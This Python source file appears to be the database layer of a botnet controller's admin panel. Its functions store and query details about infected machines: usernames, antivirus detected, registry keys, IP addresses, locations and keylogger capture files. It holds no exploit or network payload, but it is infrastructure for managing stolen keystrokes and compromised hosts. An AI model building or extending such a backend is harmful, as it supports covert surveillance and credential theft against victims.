#imports and set environmental variables
import sqlite3
import os
import time
import re
import datetime
from datetime import date
os.environ.setdefault('DJANGO_SETTINGS_MODULE','admin_ui_project.settings')

#setup django
import django
django.setup()

#import botmaster database models
from database.models import System_Information, Antivirus, Connection, Keylogging, Location, Registry, User

#global database variables
conn = None
botinfo = None

########################################## START DATABASE
#connect the database
def connect():
	global botinfo,conn
	conn = sqlite3.connect('C:\Users\Administrator\\admin_ui_project\db.sqlite3')
	#actions = sqlite3.connect(actions.sqlite3)
	botinfo = conn.cursor()

#disconnect the database
def disconnect():
	global conn
	conn.close()

########################################## END DATABASE

########################################## GET INFORMATION
# mac address, os, cpu , connection allowed
def getSystemInformation(mac_address):
	#get system information for a specified mac address
	botinfo.execute("SELECT mac_address,op_system,cpu,connection_allowed FROM database_system_information WHERE mac_address=?",(mac_address,))
	return botinfo.fetchone()

# mac address, username
def getUsernames(mac_address):
	#get all associated username to a specified mac address
	botinfo.execute("SELECT mac_address_id,username FROM database_user WHERE mac_address_id=?",(mac_address,))
	return botinfo.fetchall()

# mac address, antivirus
def getAntiviruses(mac_address):
	#get all associated antivirus programs detected for a mac address
	botinfo.execute("SELECT mac_address_id,antivirus_detected FROM database_antivirus WHERE mac_address_id=?",(mac_address,))
	return botinfo.fetchall()

# mac address, registry
def getRegistries(mac_address):
	#get all associated registries detected for a mac address
	botinfo.execute("SELECT mac_address_id,registry FROM database_registry WHERE mac_address_id=?",(mac_address,))
	return botinfo.fetchall()

# mac address, ip address, timestamp
def getConnections(mac_address):
	#get all connections made for a mac address
	botinfo.execute("SELECT mac_address_id,ip_address,timestamp FROM database_connection WHERE mac_address_id=?",(mac_address,))
	return botinfo.fetchall()

#could need to be changed
# mac address, ip address, location
def getLocationFromMac(mac_address):
	#get all locations associated with a mac_address
	result = []
	#get ips associated with a mac address
	query = botinfo.execute("SELECT id,ip_address FROM database_connection WHERE mac_address_id=?",(mac_address,))
	for entry in query.fetchall():
		#get locations associated with all ip addresses
	 	query2 = botinfo.execute("SELECT country FROM database_location WHERE ip_address_id=?",(entry[0],))
	 	for entry2 in query2.fetchall():
	 		#build array of all locations associated with mac address
			result.insert(len(result),(mac_address,entry[1],entry2[0]))
	return result

# ip address, location
def getLocationFromIp(ip_address):
	#get all locations associated with an ip address
	result = []
	#get entries from connection table associated with ip
	query = botinfo.execute("SELECT id,ip_address FROM database_connection WHERE ip_address=?",(ip_address,))
	for entry in query.fetchall():
		#get locations associated with ip address
	 	query2 = botinfo.execute("SELECT country FROM database_location WHERE ip_address_id=?",(entry[0],))
	 	for entry2 in query2.fetchall():
	 		#build array of all locations associated with ip address
			result.insert(len(result),(entry[1],entry2[0]))
	return result

# mac address, keylog file name
def getKeyloggings(mac_address):
	#get all keylogging entries associated with a mac address
	botinfo.execute("SELECT mac_address_id,filename,timestamp FROM database_keylogging WHERE mac_address_id=?",(mac_address,))
	return botinfo.fetchall()
################################### END GET INFORMATION

################################### INSERT INFORMATION

def insertSystemInformation(mac_address, op_system='None', cpu='None',  connection_allowed=True):
	#convert boolean to integer
	if(connection_allowed==True):
		connection_allowed=1
	else:
		connection_allowed=0
	#mac address does not exist
	if(getSystemInformation(mac_address)==None):
		#add system information
		obj = System_Information(mac_address=mac_address,op_system=op_system,cpu=cpu,connection_allowed=connection_allowed)
		obj.save()

def insertAntivirus(mac_address,antivirus_detected):
	#invalid antirivus
	if(antivirus_detected == None):
		return -1
	#mac address exists
	if(getSystemInformation(mac_address)!=None):
		#add antivirus
		sys_info = System_Information.objects.get(mac_address=mac_address)
		obj = Antivirus(mac_address=sys_info,antivirus_detected=antivirus_detected)
		obj.save()

def insertConnection(mac_address, ip_address, connection_type='NA'):
	#invalid ip_address
	if(ip_address == None or len(mac_address)!=17):
		return -1
	#mac address exists
	if(getSystemInformation(mac_address)!=None):
		#add connection
		sys_info = System_Information.objects.get(mac_address=mac_address)
		obj = Connection(mac_address=sys_info,ip_address=ip_address,connection_type=connection_type)
		obj.save()

def insertLocation(ip_address,location):#needs work
	#invalid location
	if(location == None):
		return -1
	#ip_address exists in connection table
	ip_addr = Connection.objects.filter(ip_address=ip_address)[0]
	if(ip_addr!=None):
		#add location
		obj = Location(ip_address=ip_addr,country=location)
		obj.save()

def insertRegistry(mac_address,registry):
	#registry is invalid
	if(registry == None):
		return -1
	#mac address exists
	if(getSystemInformation(mac_address)!=None):
		for x in getRegistries(mac_address):
			#registry already exists
			if x[1] == registry:
				return -1
		#registry does not exist, add it
		sys_info = System_Information.objects.get(mac_address=mac_address)
		obj = Registry(mac_address=sys_info,registry=registry)
		obj.save()

def insertKeylogging(mac_address, filename):
	#filename is invalid
	if(filename == None):
		return -1
	#mac address exists
	if(getSystemInformation(mac_address)!=None):
		for x in getKeyloggings(mac_address):
			#filename already exists
			if x[1] == filename:
				################################# filename already exists, handle this
				#if '.' in filename:
				#	out = filename.split('.')
				#	filename = out[0] + '1.' + out[1]
				#else:
				#	filename = filename + '1'
				#print filename
				return 0
				#insertKeylogging(mac_address, filename)
				#return 0
		#filename does not exist, add it
		sys_info = System_Information.objects.get(mac_address=mac_address)
		obj = Keylogging(mac_address=sys_info,filename=filename)
		obj.save()

def insertUsername(mac_address, username):
	#username is invalid
	if(username == None):
		return -1
	#mac address exists
	if(getSystemInformation(mac_address)!=None):
		for x in getUsernames(mac_address):
			#registry already exists
			if x[1] == username:
				return -1
		#registry does not exist, add it
		sys_info = System_Information.objects.get(mac_address=mac_address)
		obj = User(mac_address=sys_info,username=username)
		obj.save()

################################### END INSERT INFORMATION

################################### START UPDATE INFORMATION

def updateOS(mac_address, os):
	#update os for mac address
	sys_info = System_Information.objects.get(mac_address=mac_address)
	sys_info.op_system = os
	sys_info.save()

def updateCPU(mac_address, cpu):
	#update cpu for mac address
	sys_info = System_Information.objects.get(mac_address=mac_address)
	sys_info.cpu = cpu
	sys_info.save()

def updateConnectionAllowed(mac_address,connection_allowed):
	#update connection allowed for mac address
	sys_info = System_Information.objects.get(mac_address=mac_address)
	sys_info.connection_allowed = connection_allowed
	sys_info.save()

def toggleConnectionAllowed(mac_address):
	#toggle connection true/false
	sys_info = System_Information.objects.get(mac_address=mac_address)
	sys_info.connection_allowed = not(sys_info.connection_allowed)
	sys_info.save()

################################### END UPDATE INFORMATION

def isMacValid(mac_address):
	if(len(mac_address)!=17):
		return False
	if(mac_address[2]=='-' and mac_address[5]=='-' and mac_address[8]=='-' and mac_address[11]=='-' and mac_address[14]=='-'):
		return True
	else:
		return False

def isIpValid(ip_address):
    reg = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if(reg.match(ip_address)):
        return True
    else:
        return False
#connect database
connect()

#print isMacValid("12-12-12-12-12-12")
#print isMacValid("no")
#print isMacValid("12 12 12")
#print isMacValid("12-12-12-12-12-122222")

#print isIpValid("hi")
#print isIpValid("123.123.123")
#print isIpValid("1.1.1.1")
#print isIpValid("123.123.123.123.123")

# test function calls
#print getSystemInformation('00-14-22-01-23-45')
#print getUsernames('01-23-45-00-14-22')
#print getAntivirus('01-23-45-00-14-22')
#print getRegistries('01-23-45-00-14-22')
#print getConnections('01-23-45-00-14-22')
#print getKeyloggings('01-23-45-00-14-22')
#print getLocationFromMac('01-23-45-00-14-22')
#print getLocationFromIp('123.123.123.123')
#insertSystemInformation('01-23-45-67-89-00')
#insertAntivirus('01-23-45-67-89-00','Mark')
#updateOS('01-23-45-00-14-22','Winders')
#updateCPU('01-23-45-00-14-22','x86')
#updateConnectionAllowed('01-23-45-00-14-22',True)
#toggleConnectionAllowed('01-23-45-00-14-22')
#insertConnection('00-14-22-01-23-45','124.124.124.124')
#print datetime.datetime.today().strftime("%Y-%m-%d %H:%M:%S")
#print datetime.datetime.today()
#str(date.strftime("YYYY-MM-DD HH:MM[:ss[.uuuuuuuuu]][TZ]", time.now))
#insertLocation('124.124.124.124','USA')
#insertRegistry('01-23-45-00-14-22','HKEY_CURRENT_USER\Software\MCAFEE')
#insertKeylogging('01-23-45-00-14-22', 'hi')
#insertUsername('01-23-45-00-14-22','mark3')
#print len([name for name in os.listdir("./database/keylogging") if os.path.isfile(name)]) + 1
#file_count = len([f for f in os.walk("./database/keylogging").next()[2] if f[-4:] == ".txt"])
#print file_count
#print datetime.datetime.today()

#print len(getConnections("00-12-34-56-78-33"))
#print datetime.date.today()
mac_address="00-12-34-56-78-33"
today = datetime.date.today()
format = '%Y-%m-%d'
epoch = int(time.mktime(time.strptime(str(today),format)))
tomorrow = epoch + 86400
tomorrow = time.strftime('%Y-%m-%d', time.localtime(tomorrow))
botinfo.execute("SELECT mac_address_id,ip_address,timestamp FROM database_connection WHERE mac_address_id=? AND timestamp BETWEEN ? AND ?",(mac_address,today,tomorrow,))
data = botinfo.fetchall()
print data

#disconnect database
disconnect()